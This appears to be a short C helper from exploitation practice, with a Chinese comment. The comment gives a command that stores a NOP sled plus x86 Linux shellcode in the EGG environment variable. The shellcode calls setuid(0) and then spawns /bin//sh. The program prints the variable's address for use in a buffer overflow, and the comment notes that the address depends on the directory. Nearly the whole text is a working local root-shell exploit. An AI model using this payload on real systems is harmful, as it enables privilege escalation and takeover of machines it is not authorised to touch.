/*
向环境变量中传参：
export EGG=$(python -c "print '\x90'*1000 + '\x6a\x17\x58\x31\xdb\xcd\x80\x6a\x0b\x58\x99\x52\x68//sh\x68/bin\x89\xe3\x52\x53\x89\xe1\xcd\x80'")

同时注意环境变量在不停目录下的地址不同。需要放在同目录下，或相同长度目录下

*/


#include <stdio.h>
#include <stdlib.h>


int main(void){
	printf("Egg address: %p ",getenv("EGG"));
}

